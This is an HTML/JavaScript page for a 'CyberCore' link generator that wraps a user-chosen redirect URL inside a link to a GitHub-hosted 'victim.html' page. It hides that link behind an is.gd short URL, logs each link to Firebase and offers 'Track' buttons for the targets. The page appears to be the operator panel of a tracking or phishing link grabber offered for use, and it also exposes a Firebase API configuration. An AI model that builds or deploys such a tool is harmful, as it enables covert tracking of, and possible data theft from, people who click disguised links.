<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberCore | Ultra-Fast Link Gen</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        .cyber-card { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(15px); border: 1px solid #e5e7eb; }
        .animate-in { animation: fadeIn 0.4s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
        .fast-pulse { animation: pulse 1s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
    </style>
</head>
<body class="bg-[#f8fafc] min-h-screen p-4 flex flex-col items-center font-sans">

    <div class="w-full max-w-2xl mb-6 flex items-center justify-between">
        <button onclick="location.href='dashboard.html'" class="bg-white p-3 rounded-2xl shadow-sm hover:text-green-600 transition active:scale-90">
            <i class="fa-solid fa-chevron-left"></i>
        </button>
        <h1 class="text-xl font-black text-gray-800 italic uppercase tracking-tighter">Cyber<span class="text-green-600">Core</span> v14</h1>
        <div class="w-10"></div>
    </div>

    <div class="cyber-card w-full max-w-2xl rounded-[2.5rem] shadow-xl overflow-hidden mb-8">
        <div class="bg-gray-900 p-8 text-center text-white">
            <p class="text-[10px] font-black text-green-400 tracking-[0.4em] uppercase mb-2">High-Speed Shortener Active</p>
            <h2 class="text-lg font-bold italic underline decoration-green-500">Fast-Track Link Protocol</h2>
        </div>

        <div class="p-8 space-y-6">
            <div>
                <label class="block text-[10px] font-black text-gray-400 uppercase mb-2 ml-1 italic text-zinc-500">Target Redirect URL</label>
                <input type="text" id="redirectUrl" placeholder="https://instagram.com/p/..." 
                       class="w-full p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:border-green-500 transition-all text-sm font-medium">
            </div>

            <button id="genBtn" onclick="generateAndSave()" class="w-full bg-gray-900 text-white font-black py-5 rounded-2xl hover:bg-black transition-all uppercase tracking-widest text-sm shadow-lg active:scale-95 flex items-center justify-center">
                <span id="btnText">⚡ Execute & Shorten</span>
            </button>

            <div id="resultBox" class="hidden space-y-4 pt-4 border-t border-dashed border-gray-200 animate-in">
                <div class="p-5 bg-green-50 rounded-3xl border-2 border-dashed border-green-200 relative">
                    <p class="text-[10px] font-black text-green-600 mb-2 uppercase italic tracking-widest text-zinc-500">Encrypted Short Link:</p>
                    <p id="finalLink" class="text-xs font-mono font-bold text-gray-800 break-all pr-12 leading-loose">--</p>
                    <button onclick="copyToClipboard()" class="absolute right-5 top-12 text-green-600 hover:scale-125 transition-transform active:text-green-800">
                        <i class="fa-solid fa-copy text-2xl"></i>
                    </button>
                </div>
            </div>
        </div>
    </div>

    <div class="w-full max-w-2xl bg-white rounded-[2.5rem] shadow-md border border-gray-100 overflow-hidden mb-10">
        <div class="p-6 border-b border-gray-50 bg-gray-50/50 flex justify-between items-center">
            <h3 class="font-black text-[10px] uppercase text-gray-500 tracking-widest">Recent Node Transactions</h3>
            <span class="text-[10px] text-green-600 font-bold bg-green-50 px-2 py-1 rounded">Live DB Connected</span>
        </div>
        <div class="overflow-x-auto">
            <table class="w-full text-left text-xs">
                <thead class="bg-gray-50 text-gray-400 font-black uppercase border-b">
                    <tr>
                        <th class="p-4">Time</th>
                        <th class="p-4">Short Link Preview</th>
                        <th class="p-4">Command</th>
                    </tr>
                </thead>
                <tbody id="historyBody" class="font-bold text-gray-600">
                    </tbody>
            </table>
        </div>
    </div>

    <script>
        // --- Firebase Configuration ---
        const firebaseConfig = {
            apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
            authDomain: "in-app-update-21c61.firebaseapp.com",
            databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
            projectId: "in-app-update-21c61",
            storageBucket: "in-app-update-21c61.firebasestorage.app",
            messagingSenderId: "1013483026768",
            appId: "1:1013483026768:web:c5f54060842f9672431455"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const userMobile = localStorage.getItem("loggedInUser") || "Guest_01";

        // --- Fast Generate & Shorten Logic ---
        async function generateAndSave() {
            const redirect = document.getElementById('redirectUrl').value;
            const btnText = document.getElementById('btnText');
            const genBtn = document.getElementById('genBtn');

            if(!redirect.startsWith('http')) return alert("Bhai, URL sahi se dalo (http/https)!");

            // Instant UI Feedback
            btnText.innerText = "⚡ BYPASSING DELAY...";
            genBtn.disabled = true;
            genBtn.classList.add('fast-pulse');

            const githubPage = "https://sufih4x-rgb.github.io/cybersecurity/victim.html";
            const encodedRedirect = btoa(redirect);
            const longTrackingLink = `${githubPage}?id=${userMobile}&r=${encodedRedirect}`;

            // Timeout Mechanism (3 Seconds max for API)
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 3500);

            try {
                // Using Is.gd API (Faster than TinyURL)
                const response = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(longTrackingLink)}`, { signal: controller.signal });
                const shortLink = await response.text();

                if(!shortLink.startsWith('http')) throw new Error('API_REJECTED');

                await finalize(shortLink, redirect);
            } catch (err) {
                console.log("API Delayed, using Direct Link...");
                await finalize(longTrackingLink, redirect);
            } finally {
                clearTimeout(timeoutId);
                btnText.innerText = "⚡ Execute & Shorten";
                genBtn.disabled = false;
                genBtn.classList.remove('fast-pulse');
            }
        }

        async function finalize(url, dest) {
            const newRef = db.ref('users/' + userMobile + '/linkHistory').push();
            await newRef.set({
                timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
                url: url,
                dest: dest
            });

            document.getElementById('finalLink').innerText = url;
            document.getElementById('resultBox').classList.remove('hidden');
        }

        // --- History Logic ---
        function loadHistory() {
            db.ref('users/' + userMobile + '/linkHistory').on('value', snap => {
                const body = document.getElementById('historyBody');
                body.innerHTML = "";
                snap.forEach(child => {
                    const data = child.val();
                    const row = `
                        <tr class="border-b border-gray-50 hover:bg-gray-50 animate-in">
                            <td class="p-4 text-gray-400 italic">${data.timestamp}</td>
                            <td class="p-4 text-blue-600 font-mono text-[10px]">${data.url.substring(0, 32)}...</td>
                            <td class="p-4">
                                <button onclick="trackNow('${child.key}')" class="bg-gray-900 text-white px-4 py-2 rounded-xl text-[10px] hover:bg-green-600 transition tracking-tighter uppercase font-black">
                                    Track
                                </button>
                            </td>
                        </tr>`;
                    body.insertAdjacentHTML('afterbegin', row);
                });
            });
        }

        function trackNow(id) {
            location.href = `tracking.html?target=${id}`;
        }

        function copyToClipboard() {
            const text = document.getElementById('finalLink').innerText;
            navigator.clipboard.writeText(text).then(() => {
                alert("Target Link Copied to Clipboard!");
            });
        }

        window.onload = loadHistory;
    </script>
</body>
</html>
